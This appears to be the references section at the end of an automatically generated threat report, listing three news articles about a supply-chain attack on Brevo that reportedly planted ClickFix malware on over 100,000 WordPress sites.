- [Security Affairs: Brevo Supply-Chain Attack Infected Over 100,000 Websites](https://securityaffairs.com/199355/hacking/brevo-supply-chain-attack-infected-over-100000-websites.html) -- additional context on attack scope and affected Brevo properties
- [CyberInsider: 100,000+ WordPress Sites Infected via Brevo Supply Chain Attack](https://cyberinsider.com/100000-wordpress-sites-infected-via-brevo-supply-chain-attack/) -- additional CSP violation report data and detection indicators
- [The420.in: Brevo Supply-Chain Attack Injects ClickFix Malware Into Customer Websites](https://the420.in/brevo-supply-chain-attack-cloudflare-clickfix-customer-websites/) -- additional WordPress plugin persistence details

---
*Report generated by Actioner*
